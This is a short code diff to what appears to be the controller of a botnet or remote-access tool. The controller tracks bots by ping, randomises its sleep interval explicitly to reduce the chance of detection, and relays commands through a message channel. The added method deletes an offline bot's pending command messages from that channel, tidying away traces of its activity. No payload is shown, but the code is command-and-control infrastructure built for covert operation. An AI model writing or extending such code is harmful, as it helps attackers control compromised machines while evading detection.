@@ -112,6 +112,8 @@ class Controller:
                 for bot_id, bot in self.bots.items():
                     if bot["last_ping"] == self.last_ping:
                         active_bots[bot_id] = bot
+                    elif bot["commands"]:
+                        self.cancel_running_commands(bot["commands"])
 
                 self.bots = active_bots
 
@@ -122,6 +124,18 @@ class Controller:
 
             # Randomized sleep for a lesser chance of detection
             sleep(random.uniform(50, 70))
+
+    def cancel_running_commands(self, commands: dict):
+        """
+        Cancels running commands and clears them from the channel if the bot goes offline
+        :param commands:
+        :return:
+        """
+        for running_cmd, _ in commands.items():
+            try:
+                self.channel.delete_message(running_cmd)
+            except:
+                continue
 
     def wait_for_commands(self):
         """
